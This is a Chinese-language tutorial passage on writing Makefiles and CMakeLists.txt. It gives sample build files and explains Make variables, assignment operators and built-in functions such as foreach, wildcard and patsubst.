<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">CXX = g++</span><br><span class="line">CFLAGS = -Wall -Werror -Wshadow -std=c11</span><br><span class="line">CXXFLAGS += -DLINUX -DUSE_SPDLOG -Wall -Wshadow -std=c++14</span><br><span class="line">LFLAGS =</span><br><span class="line"></span><br><span class="line"><span class="comment">#要编译的目标</span></span><br><span class="line">TARGET = run</span><br><span class="line"><span class="comment">#源文件路径，跟makefile文件同目录不用填，目录使用/结束</span></span><br><span class="line">SRCDIR = ./app/ ./utils/</span><br><span class="line"><span class="comment">#这些HEADERS将被安装到 $(PREFIX_INC) 目录下面，供其他模块使用，多个头文件空格分开</span></span><br><span class="line">HEADERS = -I<span class="variable">$(PREFIX_INC)</span></span><br><span class="line"><span class="comment">#编译中间文件路径，跟SRCDIR目录不用填，目录使用/结束</span></span><br><span class="line">OBJDIR =</span><br><span class="line"><span class="comment">#链接库名，带上-l，-lsvpn 静态库填写绝对路径</span></span><br><span class="line">LIB = -pthread -ldl ../build/output/libspdlogd.a <span class="comment">#-lmylib -lcurl  ../threepart/libhv/lib/libhv.a</span></span><br><span class="line"><span class="comment">#引用头文件路径，带上-I， -I$(PREFIX_INC)</span></span><br><span class="line">INCLUDE =</span><br><span class="line"></span><br><span class="line"><span class="comment"># gcov</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(debug)</span>, 1)</span><br><span class="line">	CFLAGS   := <span class="variable">$(<span class="built_in">filter</span>-out -O2, <span class="variable">$(CFLAGS)</span>)</span></span><br><span class="line">	CXXFLAGS := <span class="variable">$(<span class="built_in">filter</span>-out -O2, <span class="variable">$(CXXFLAGS)</span>)</span></span><br><span class="line">	CFLAGS   += -g -DDEBUG_GLOBAL --coverage</span><br><span class="line">	CXXFLAGS += -g -DDEBUG_GLOBAL --coverage</span><br><span class="line">	LFLAGS  += --coverage</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果为空，就是当前目录</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(SRCDIR)</span>,)</span><br><span class="line">	SRCDIR += ./</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面四个命令通过模式匹配获取当前目录下的所有C,CPP,O文件</span></span><br><span class="line">CPP_SOURCES = <span class="variable">$(<span class="built_in">foreach</span> d,<span class="variable">$(SRCDIR)</span>,$(<span class="built_in">wildcard</span> <span class="variable">$(d)</span>*.cpp)</span>)</span><br><span class="line">C_SOURCES = <span class="variable">$(<span class="built_in">foreach</span> d,<span class="variable">$(SRCDIR)</span>,$(<span class="built_in">wildcard</span> <span class="variable">$(d)</span>*.c)</span>)</span><br><span class="line">CPP_OBJS = <span class="variable">$(<span class="built_in">patsubst</span> %.cpp, <span class="variable">$(OBJDIR)</span>%.o, <span class="variable">$(CPP_SOURCES)</span>)</span></span><br><span class="line">C_OBJS = <span class="variable">$(<span class="built_in">patsubst</span> %.c, <span class="variable">$(OBJDIR)</span>%.o, <span class="variable">$(C_SOURCES)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面把一些其他目录下的源文件也放到里面</span></span><br><span class="line">SOURCES += <span class="variable">$(CPP_SOURCES)</span> <span class="variable">$(C_SOURCES)</span> $(OBJS:%.o=%.c*)</span><br><span class="line">OBJS += <span class="variable">$(CPP_OBJS)</span> <span class="variable">$(C_OBJS)</span></span><br><span class="line">ALL_GCNO = $(OBJS:%.o=%.gcno)</span><br><span class="line">ALL_GCDA = $(OBJS:%.o=%.gcda)</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean all cp cpp cpso _clean _all _install test</span></span><br><span class="line"></span><br><span class="line"><span class="section">.SUFFIXES: .c .cpp .o</span></span><br><span class="line"></span><br><span class="line"><span class="section">.c.o:</span></span><br><span class="line">	<span class="variable">$(CC)</span> -c <span class="variable">$*</span>.c -o <span class="variable">$*</span>.o <span class="variable">$(INCLUDE)</span> <span class="variable">$(CFLAGS)</span></span><br><span class="line"><span class="section">.cpp.o:</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$*</span>.cpp -o <span class="variable">$*</span>.o <span class="variable">$(INCLUDE)</span> <span class="variable">$(CXXFLAGS)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(_all)</span></span></span><br><span class="line"></span><br><span class="line"><span class="section">header:</span></span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(HEADERS)</span>,)</span><br><span class="line">	install -d <span class="variable">$(PREFIX_INC)</span></span><br><span class="line">	install --verbose --mode=0644 <span class="variable">$(HEADERS)</span> <span class="variable">$(PREFIX_INC)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJS)</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(CPP_OBJS)</span>,)</span><br><span class="line">	<span class="variable">$(CC)</span>  <span class="variable">$(LFLAGS)</span> -o <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(OBJS)</span> -L<span class="variable">$(PREFIX_LIB)</span> <span class="variable">$(LIB)</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(LFLAGS)</span> -o <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(OBJS)</span> -L<span class="variable">$(PREFIX_LIB)</span> <span class="variable">$(LIB)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line">	make header</span><br><span class="line"></span><br><span class="line"><span class="section">install: all <span class="variable">$(_install)</span> <span class="variable">$(HEADERS)</span></span></span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(debug)</span>, 1)</span><br><span class="line">	strip <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line">	install -d <span class="variable">$(INSTALL_TARGETDIR)</span></span><br><span class="line">	install --verbose --mode=0755 <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(INSTALL_TARGETDIR)</span></span><br><span class="line"></span><br><span class="line"><span class="section">cp: <span class="variable">$(_cp)</span></span></span><br><span class="line"></span><br><span class="line"><span class="section">cppscan:clean</span></span><br><span class="line">	install -d <span class="variable">$(CPPTEST_WORKSPACE)</span>/<span class="variable">$(TARGET)</span></span><br><span class="line">	cpptesttrace --cpptesttraceOutputFile=<span class="variable">$(TARGET)</span>.bdf --cpptesttraceProjectName=<span class="variable">$(TARGET)</span> make || echo</span><br><span class="line">	cpptestcli -data <span class="variable">$(CPPTEST_WORKSPACE)</span> -resource <span class="variable">$(TARGET)</span> -bdf <span class="variable">$(TARGET)</span>.bdf -config user://mustfix -report <span class="variable">$(CPPTEST_REPORT)</span>/<span class="variable">$(REPORTDIR)</span> || echo</span><br><span class="line"></span><br><span class="line"><span class="section">clean: <span class="variable">$(_clean)</span></span></span><br><span class="line">	rm -f <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(OBJS)</span> <span class="variable">$(TARGET)</span>.bdf <span class="variable">$(ALL_GCNO)</span> <span class="variable">$(ALL_GCDA)</span></span><br><span class="line">	rm -f gcov.zip *.gcda *.gcno</span><br><span class="line">	rm -f <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span>_test ./test/*.o</span><br><span class="line"></span><br><span class="line"><span class="section">gcov:</span></span><br><span class="line">	<span class="variable">$(LCOV_GCOV_TOOL)</span> `pwd`</span><br></pre></td></tr></table></figure>

<ul>
<li>编译so库的示例</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">CXX = g++</span><br><span class="line">CFLAGS = -fPIC -Wall -Werror -Wshadow -std=c11</span><br><span class="line">CXXFLAGS = -fPIC -Wall -Wshadow -std=c++14</span><br><span class="line">LFLAGS = -shared -fPIC</span><br><span class="line"></span><br><span class="line"><span class="comment">#要编译的目标</span></span><br><span class="line">TARGET = skf.so</span><br><span class="line"><span class="comment">#源文件路径，跟makefile文件同目录不用填，目录使用/结束</span></span><br><span class="line">SRCDIR = ./</span><br><span class="line"><span class="comment">#这些HEADERS将被安装到 $(PREFIX_INC) 目录下面，供其他模块使用，多个头文件空格分开</span></span><br><span class="line">HEADERS = -I<span class="variable">$(PREFIX_INC)</span></span><br><span class="line"><span class="comment">#编译中间文件路径，跟SRCDIR目录不用填，目录使用/结束</span></span><br><span class="line">OBJDIR =</span><br><span class="line"><span class="comment">#链接库名，带上-l，-lsvpn 静态库填写绝对路径</span></span><br><span class="line">LIB = -pthread -ldl ../build/output/libspdlogd.a <span class="comment">#-lmylib -lcurl  ../threepart/libhv/lib/libhv.a</span></span><br><span class="line"><span class="comment">#引用头文件路径，带上-I， -I$(PREFIX_INC)</span></span><br><span class="line">INCLUDE =</span><br><span class="line"></span><br><span class="line"><span class="comment"># gcov</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(debug)</span>, 1)</span><br><span class="line">	CFLAGS   := <span class="variable">$(<span class="built_in">filter</span>-out -O2, <span class="variable">$(CFLAGS)</span>)</span></span><br><span class="line">	CXXFLAGS := <span class="variable">$(<span class="built_in">filter</span>-out -O2, <span class="variable">$(CXXFLAGS)</span>)</span></span><br><span class="line">	CFLAGS   += -g -DDEBUG_GLOBAL --coverage</span><br><span class="line">	CXXFLAGS += -g -DDEBUG_GLOBAL --coverage</span><br><span class="line">	LFLAGS  += --coverage</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果为空，就是当前目录</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(SRCDIR)</span>,)</span><br><span class="line">	SRCDIR += ./</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面四个命令通过模式匹配获取当前目录下的所有C,CPP,O文件</span></span><br><span class="line">CPP_SOURCES = <span class="variable">$(<span class="built_in">foreach</span> d,<span class="variable">$(SRCDIR)</span>,$(<span class="built_in">wildcard</span> <span class="variable">$(d)</span>*.cpp)</span>)</span><br><span class="line">C_SOURCES = <span class="variable">$(<span class="built_in">foreach</span> d,<span class="variable">$(SRCDIR)</span>,$(<span class="built_in">wildcard</span> <span class="variable">$(d)</span>*.c)</span>)</span><br><span class="line">CPP_OBJS = <span class="variable">$(<span class="built_in">patsubst</span> %.cpp, <span class="variable">$(OBJDIR)</span>%.o, <span class="variable">$(CPP_SOURCES)</span>)</span></span><br><span class="line">C_OBJS = <span class="variable">$(<span class="built_in">patsubst</span> %.c, <span class="variable">$(OBJDIR)</span>%.o, <span class="variable">$(C_SOURCES)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面把一些其他目录下的源文件也放到里面</span></span><br><span class="line">SOURCES += <span class="variable">$(CPP_SOURCES)</span> <span class="variable">$(C_SOURCES)</span> $(OBJS:%.o=%.c*)</span><br><span class="line">OBJS += <span class="variable">$(CPP_OBJS)</span> <span class="variable">$(C_OBJS)</span></span><br><span class="line">ALL_GCNO = $(OBJS:%.o=%.gcno)</span><br><span class="line">ALL_GCDA = $(OBJS:%.o=%.gcda)</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean all cp cpp cpso _clean _all _install test</span></span><br><span class="line"></span><br><span class="line"><span class="section">.SUFFIXES: .c .cpp .o</span></span><br><span class="line"></span><br><span class="line"><span class="section">.c.o:</span></span><br><span class="line">	<span class="variable">$(CC)</span> -c <span class="variable">$*</span>.c -o <span class="variable">$*</span>.o <span class="variable">$(INCLUDE)</span> <span class="variable">$(CFLAGS)</span></span><br><span class="line"><span class="section">.cpp.o:</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$*</span>.cpp -o <span class="variable">$*</span>.o <span class="variable">$(INCLUDE)</span> <span class="variable">$(CXXFLAGS)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(_all)</span></span></span><br><span class="line"></span><br><span class="line"><span class="section">header:</span></span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(HEADERS)</span>,)</span><br><span class="line">	install -d <span class="variable">$(PREFIX_INC)</span></span><br><span class="line">	install --verbose --mode=0644 <span class="variable">$(HEADERS)</span> <span class="variable">$(PREFIX_INC)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJS)</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(CPP_OBJS)</span>,)</span><br><span class="line">	<span class="variable">$(CC)</span>  <span class="variable">$(LFLAGS)</span> -o <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(OBJS)</span> -L<span class="variable">$(PREFIX_LIB)</span> <span class="variable">$(LIB)</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(LFLAGS)</span> -o <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(OBJS)</span> -L<span class="variable">$(PREFIX_LIB)</span> <span class="variable">$(LIB)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line">	make header</span><br><span class="line"></span><br><span class="line"><span class="section">install: all <span class="variable">$(_install)</span> <span class="variable">$(HEADERS)</span></span></span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(debug)</span>, 1)</span><br><span class="line">	strip <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line">	install -d <span class="variable">$(INSTALL_TARGETDIR)</span></span><br><span class="line">	install --verbose --mode=0755 <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(INSTALL_TARGETDIR)</span></span><br><span class="line"></span><br><span class="line"><span class="section">cp: <span class="variable">$(_cp)</span></span></span><br><span class="line"></span><br><span class="line"><span class="section">cppscan:clean</span></span><br><span class="line">	install -d <span class="variable">$(CPPTEST_WORKSPACE)</span>/<span class="variable">$(TARGET)</span></span><br><span class="line">	cpptesttrace --cpptesttraceOutputFile=<span class="variable">$(TARGET)</span>.bdf --cpptesttraceProjectName=<span class="variable">$(TARGET)</span> make || echo</span><br><span class="line">	cpptestcli -data <span class="variable">$(CPPTEST_WORKSPACE)</span> -resource <span class="variable">$(TARGET)</span> -bdf <span class="variable">$(TARGET)</span>.bdf -config user://mustfix -report <span class="variable">$(CPPTEST_REPORT)</span>/<span class="variable">$(REPORTDIR)</span> || echo</span><br><span class="line"></span><br><span class="line"><span class="section">clean: <span class="variable">$(_clean)</span></span></span><br><span class="line">	rm -f <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(OBJS)</span> <span class="variable">$(TARGET)</span>.bdf <span class="variable">$(ALL_GCNO)</span> <span class="variable">$(ALL_GCDA)</span></span><br><span class="line">	rm -f gcov.zip *.gcda *.gcno</span><br><span class="line">	rm -f <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span>_test ./test/*.o</span><br><span class="line"></span><br><span class="line"><span class="section">gcov:</span></span><br><span class="line">	<span class="variable">$(LCOV_GCOV_TOOL)</span> `pwd`</span><br></pre></td></tr></table></figure>

<h2 id="1-默认规则"><a href="#1-默认规则" class="headerlink" title="1. 默认规则"></a>1. 默认规则</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">default :</span><br><span class="line">    make run</span><br></pre></td></tr></table></figure>

<ul>
<li>添加默认规则，直接使用make将执行default下的命令</li>
</ul>
<h2 id="2-文件生成"><a href="#2-文件生成" class="headerlink" title="2. 文件生成"></a>2. 文件生成</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件生成规则</span></span><br><span class="line">ipl.bin : ipl.nas Makefile</span><br><span class="line">    ../z_tools/nask.exe ipl.bin ipl.lst</span><br><span class="line"></span><br><span class="line">helloOS.img : ipl.bin Makefile</span><br><span class="line">    ../z_tools/edimg.exe imgin:../z_tools/fdimg0at.tek</span><br></pre></td></tr></table></figure>

<ul>
<li><code>#</code>代表注释</li>
<li><code>ipl.bin : ipl.nas Makefile</code>代表需要制作<code>ipl.bin</code>文件需要<code>ipl.nas</code>和<code>Makefile</code>，如果都有，执行下面的语句</li>
<li><code>\</code>代表续行符号</li>
</ul>
<h2 id="3-变量使用"><a href="#3-变量使用" class="headerlink" title="3. 变量使用"></a>3. 变量使用</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">TOOLPATH    = ../z_tools</span><br><span class="line">MAKE        = <span class="variable">$(TOOLPATH)</span>/make.exe -r</span><br><span class="line">NASK        = <span class="variable">$(TOOLPATH)</span>/nask.exe</span><br><span class="line">EDIMG       = <span class="variable">$(TOOLPATH)</span>/edimg.exe</span><br><span class="line">IMGTOL      = <span class="variable">$(TOOLPATH)</span>/imgtol.com</span><br><span class="line">COPY        = copy</span><br><span class="line">DEL         = del</span><br></pre></td></tr></table></figure>

<h2 id="4-运行规则"><a href="#4-运行规则" class="headerlink" title="4. 运行规则"></a>4. 运行规则</h2><ol>
<li>先根据编译命令寻找规则</li>
<li>找到规则后，匹配后面的依赖</li>
<li>依赖匹配按照从上向下匹配，两个规则均满足，使用第一个</li>
<li>如果依赖不满足，根据依赖继续找依赖的规则</li>
<li>依赖满足，根据后面的命令进行编译</li>
</ol>
<h2 id="5-内置变量符号含义"><a href="#5-内置变量符号含义" class="headerlink" title="5. 内置变量符号含义"></a>5. 内置变量符号含义</h2><h3 id="5-1-匹配符-和通配符-的区别"><a href="#5-1-匹配符-和通配符-的区别" class="headerlink" title="5.1. 匹配符%和通配符*的区别"></a>5.1. 匹配符%和通配符*的区别</h3><p>所以虽然两个符号的意思有点沾边，但是他们的工作方式时完全不一样。</p>
<p><strong>匹配符%的意思</strong></p>
<ol>
<li>我要找test1.o的构造规则，看看Makefile中那个规则符合。</li>
<li>然后找到了 <code>%.o : %.c</code></li>
<li>来套一下来套一下：</li>
<li><code>%.o</code> 和我要找的 <code>test1.o</code> 匹配</li>
<li>套上了，得到%&#x3D;test1。</li>
<li>所以在后面的 <code>%.c</code> 就表示 <code>test1.c</code> 了。</li>
<li>OK进行构造</li>
</ol>
<p><strong>通配符*的意思</strong></p>
<ol>
<li>我不知道目标的名字，系统该目录下中所有后缀为.c的文件都是我要找的。</li>
<li>然后遍历目录的文件，看是否匹配。找出所有匹配的项目。</li>
</ol>
<h3 id="5-2-特殊符号"><a href="#5-2-特殊符号" class="headerlink" title="5.2. 特殊符号"></a>5.2. 特殊符号</h3><ul>
<li><code>$@</code>: 目标的名字</li>
<li><code>$^</code>: 构造所需文件列表所有所有文件的名字</li>
<li><code>$&lt;</code>: 构造所需文件列表的第一个文件的名字</li>
<li><code>$?</code>: 构造所需文件列表中更新过的文件</li>
<li><code>$*</code>: 匹配的目标模式中%及前面的部分，如: <code>dir/a.foo.b</code>被<code>a.%.b</code>匹配，<code>$*</code>代表<code>dir/a.foo</code></li>
</ul>
<h3 id="5-3-、-、-、"><a href="#5-3-、-、-、" class="headerlink" title="5.3. =、:=、?=、+="></a>5.3. <code>=</code>、<code>:=</code>、<code>?=</code>、<code>+=</code></h3><h4 id="1-整体拉通赋值"><a href="#1-整体拉通赋值" class="headerlink" title="1) = 整体拉通赋值"></a>1) <code>=</code> 整体拉通赋值</h4><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">VAR_A = A</span><br><span class="line">VAR_B = $&#123;VAR_A&#125; B</span><br><span class="line">VAR_A = <span class="variable">$(VAR_B)</span> A</span><br></pre></td></tr></table></figure>

<ul>
<li>这样写makefile就会报错，因为循环赋值，最终makefile不知道怎么拉通了</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">VAR_A = A</span><br><span class="line">VAR_B = $&#123;VAR_A&#125; B</span><br><span class="line">VAR_A = AA</span><br></pre></td></tr></table></figure>

<h4 id="2-当前此位置的值赋值"><a href="#2-当前此位置的值赋值" class="headerlink" title="2) := 当前此位置的值赋值"></a>2) <code>:=</code> 当前此位置的值赋值</h4><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">VAR_A = A</span><br><span class="line">VAR_B := $&#123;VAR_A&#125; B</span><br><span class="line">VAR_A = AA</span><br></pre></td></tr></table></figure>

<ul>
<li>当前位置的值直接赋值，这里的<code>VAR_B</code>会等于当前到这个位置时的值<code>A B</code></li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">VAR_C = C</span><br><span class="line">VAR_A = <span class="variable">$(VAR_C)</span> A</span><br><span class="line">VAR_B := <span class="variable">$(VAR_A)</span> B</span><br><span class="line">VAR_A = <span class="variable">$(VAR_C)</span> AA</span><br><span class="line">VAR_C = CC</span><br></pre></td></tr></table></figure>

<ul>
<li>这里的<code>VAR_B</code>会等于当前到这个位置时的值<code>C A B</code>，但是<code>VAR_A</code>为<code>CC AA</code></li>
</ul>
<h4 id="3-没赋值就赋值"><a href="#3-没赋值就赋值" class="headerlink" title="3) ?= 没赋值就赋值"></a>3) <code>?=</code> 没赋值就赋值</h4><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">VAR_C = C</span><br><span class="line">VAR_C ?= CC</span><br></pre></td></tr></table></figure>

<ul>
<li>最终<code>VAR_C</code>为<code>C</code></li>
</ul>
<h4 id="4-新增"><a href="#4-新增" class="headerlink" title="4) += 新增"></a>4) <code>+=</code> 新增</h4><ul>
<li>就是新增，没什么多余东西</li>
</ul>
<h2 id="6-内置函数"><a href="#6-内置函数" class="headerlink" title="6. 内置函数"></a>6. 内置函数</h2><h3 id="6-1-foreach"><a href="#6-1-foreach" class="headerlink" title="6.1. foreach"></a>6.1. foreach</h3><ul>
<li>用var遍历list，在text中对var进行操作</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="variable">$(<span class="built_in">foreach</span> &lt;var&gt;,&lt;list&gt;,&lt;text&gt;)</span></span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">C_SOURCES = <span class="variable">$(<span class="built_in">foreach</span> d,<span class="variable">$(SRCDIR)</span>,$(<span class="built_in">wildcard</span> <span class="variable">$(d)</span>*.c)</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>遍历SRCDIR，每个元素给到d中，然后执行<code>$(wildcard $(d)*.c)</code>输出</li>
<li>因为是<code>$(d)*c</code>，所以<code>$(SRCDIR)</code>每个目录要以<code>/</code>结尾</li>
</ul>
<h3 id="6-2-wildcard"><a href="#6-2-wildcard" class="headerlink" title="6.2. wildcard"></a>6.2. wildcard</h3><ul>
<li>在Makefile规则中，通配符会被自动展开。但在变量的定义和函数引用时，通配符将失效。这种情况下如果需要通配符有效，就需要使用函数“wildcard”</li>
<li>它的用法是：<code>$(wildcard PATTERN...)</code></li>
<li>Makefile中，它被展开为已经存在的、使用空格分开的、匹配此模式的所有文件列表。</li>
</ul>
<h3 id="6-3-patsubst"><a href="#6-3-patsubst" class="headerlink" title="6.3. patsubst"></a>6.3. patsubst</h3><ul>
<li>替换列表中的字符串</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="variable">$(<span class="built_in">patsubst</span> 原模式， 目标模式， 文件列表)</span></span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">C_OBJS = <span class="variable">$(<span class="built_in">patsubst</span> %.c, <span class="variable">$(OBJDIR)</span>%.o, <span class="variable">$(C_SOURCES)</span>)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>取<code>C_SOURCES</code>列表文件，每一个执行<code>%.c</code>到<code>$(OBJDIR)%.o</code>的替换</li>
</ul>
<h3 id="6-4-echo"><a href="#6-4-echo" class="headerlink" title="6.4. echo"></a>6.4. echo</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">img :</span><br><span class="line">	@echo <span class="variable">$(SRCDIR)</span></span><br><span class="line">	@echo <span class="variable">$(C_SOURCES)</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> haribote.img</span><br></pre></td></tr></table></figure>

<h2 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h2><ul>
<li>Makefile需要用tab而非空格进行缩进，否则会报<code>*** multiple target patterns.  Stop.</code></li>
</ul>
<h1 id="二、CMakeLists-txt"><a href="#二、CMakeLists-txt" class="headerlink" title="二、CMakeLists.txt"></a>二、<span id="CMakeLists">CMakeLists.txt</span></h1><h2 id="1-一些基本命令"><a href="#1-一些基本命令" class="headerlink" title="1. 一些基本命令"></a>1. 一些基本命令</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment">########## 工程定义 ##########</span></span><br><span class="line"><span class="comment"># cmake最小支持版本3.8</span></span><br><span class="line"><span class="keyword">CMAKE_MINIMUM_REQUIRED</span>(VERSION <span class="number">3.8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 项目工程名字</span></span><br><span class="line"><span class="keyword">PROJECT</span>(Clion_cppStudy</span><br><span class="line">    LANGUAGES C CXX</span><br><span class="line">    VERSION <span class="number">1.0</span>.<span class="number">0.0</span></span><br><span class="line">    DESCRIPTION <span class="string">&quot;Diy c++ project&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">########## 变量 ##########</span></span><br><span class="line"><span class="comment"># 设置lib库生成路径</span></span><br><span class="line"><span class="keyword">set</span>(LIBRARY_OUTPUT_PATH <span class="variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/build/lib)</span><br><span class="line"><span class="comment"># 设置bin文件生成路径</span></span><br><span class="line"><span class="keyword">set</span>(EXECUTABLE_OUTPUT_PATH <span class="variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/build/bin</span><br><span class="line"><span class="comment"># 编译命令导出json给其他地方使用，vim的ycm可以使用作为代码提示</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_EXPORT_COMPILE_COMMANDS <span class="keyword">ON</span>)</span><br><span class="line"><span class="comment"># 设置C++标准</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="comment"># 设置符号隐藏</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_C_VISIBILITY_PRESET hidden)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_VISIBILITY_PRESET hidden)</span><br><span class="line"></span><br><span class="line"><span class="comment">########## 选项 ##########</span></span><br><span class="line"><span class="comment"># 设置选项</span></span><br><span class="line"><span class="keyword">option</span>(RELEASE <span class="string">&quot;Build release, default is OFF&quot;</span> <span class="keyword">OFF</span>)</span><br><span class="line"><span class="comment"># 根据选项指定编译类型</span></span><br><span class="line"><span class="comment"># 也可以使用 -DCMAKE_BUILD_TYPE:STRING=RELEASE 来指定，默认为RELEASE</span></span><br><span class="line"><span class="comment"># 如果文件中有SET，使用选项将无效</span></span><br><span class="line"><span class="keyword">if</span>(RELEASE)</span><br><span class="line">   <span class="keyword">SET</span>(CMAKE_BUILD_TYPE <span class="string">&quot;RELEASE&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>(RELEASE)</span><br><span class="line">   <span class="keyword">SET</span>(CMAKE_BUILD_TYPE <span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"><span class="keyword">endif</span>(RELEASE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加子目录</span></span><br><span class="line"><span class="keyword">add_subdirectory</span>(src)</span><br><span class="line"></span><br><span class="line"><span class="comment"># FILE生成的是绝对路径文件</span></span><br><span class="line"><span class="comment"># GLOB和GLOB_RECUSE语法一样，但是一个会对子目录匹配，一个不会匹配子目录</span></span><br><span class="line"><span class="comment"># 两种方式都无法检测文件变化，如果文件变化需要重新config工程</span></span><br><span class="line"><span class="comment"># 匹配app和utils一级目录的c开头后缀的文件</span></span><br><span class="line"><span class="keyword">FILE</span>(GLOB SRC_FILES app/*.c* utils/*.c*)</span><br><span class="line"><span class="comment"># 匹配app和utils所有子目录的c开头后缀的文件</span></span><br><span class="line"><span class="keyword">FILE</span>(GLOB_RECURSE SRC_FILES app/*.c* utils/*.c*)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aux_source_directory生成的是相对路径</span></span><br><span class="line"><span class="comment"># aux_source_directory(&lt;dir&gt; &lt;variable&gt;) 将dir下面的所有源文件储存到变量（追加）</span></span><br><span class="line"><span class="keyword">AUX_SOURCE_DIRECTORY</span>(./app SRC_FILES)</span><br><span class="line"><span class="keyword">AUX_SOURCE_DIRECTORY</span>(./utils SRC_FILES)</span><br><span class="line"><span class="keyword">AUX_SOURCE_DIRECTORY</span>(./common COMMON_SRC_FILES)</span><br><span class="line"><span class="comment"># 合并两个列表的数据</span></span><br><span class="line"><span class="keyword">list</span>(APPEND SRC_FILES <span class="variable">$&#123;COMMON_SRC_FILES&#125;</span>)</span><br><span class="line"><span class="comment"># 删除列表中几个数据</span></span><br><span class="line"><span class="keyword">list</span>(REMOVE_ITEM SRC_FILES <span class="variable">$&#123;COMMON_SRC_FILES&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 